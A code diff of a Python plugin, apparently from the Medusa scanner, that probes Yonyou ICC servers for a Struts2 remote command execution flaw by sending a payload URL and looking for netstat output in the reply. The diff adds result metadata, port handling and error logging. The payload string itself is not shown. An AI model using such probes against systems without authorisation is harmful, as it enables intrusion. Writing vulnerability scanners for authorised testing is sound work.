@@ -1,14 +1,23 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-'''
-name: 用友ICC struts2远程命令执行
-referer: http://www.wooyun.org/bugs/wooyun-2010-023876
-author: Lucifer
-description: 用友ICC系统存在struts2框架漏洞。
-'''
+
 import urllib
 import requests
-
+import ClassCongregation
+class VulnerabilityInfo(object):
+    def __init__(self,Medusa):
+        self.info = {}
+        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
+        self.info['author'] = "Ascotbe"  # 插件作者
+        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
+        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
+        self.info['algroup'] = "Seeyou_icc_struts2"  # 插件名称
+        self.info['name'] ='' #漏洞名称
+        self.info['affects'] = "用友OA"  # 漏洞组件
+        self.info['desc_content'] = "用友OA_ICC系统框架漏洞"  # 漏洞描述
+        self.info['rank'] = "高危"  # 漏洞等级
+        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
+        self.info['details'] = Medusa  # 结果
 def UrlProcessing(url):
     if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
         res = urllib.parse.urlparse(url)
@@ -32,7 +41,7 @@ def medusa(Url,RandomAgent,ProxyIp):
     Medusas=[]
     try:
         for turl in urls:
-            payload_url = scheme+"://"+url+turl+payload
+            payload_url = scheme+"://"+url+ ':' + str(port)+turl+payload
             headers = {
                 'Accept-Encoding': 'gzip, deflate',
                 'Accept': '*/*',
@@ -50,8 +59,14 @@ def medusa(Url,RandomAgent,ProxyIp):
             con = resp.text
             code = resp.status_code
             if  con.lower().find('active internet connections')!=-1:
-                Medusa = "{} 存在用友ICC struts2远程命令执行 漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
+
+                Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                 Medusas.append(str(Medusa))
-    except Exception as e:
-        pass
-    return Medusas
+
+    except:
+            _ = VulnerabilityInfo('').info.get('algroup')
+            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
+    _t = VulnerabilityInfo(Medusas)
+    web = ClassCongregation.VulnerabilityDetails(_t.info)
+    web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+    return (_t.info)
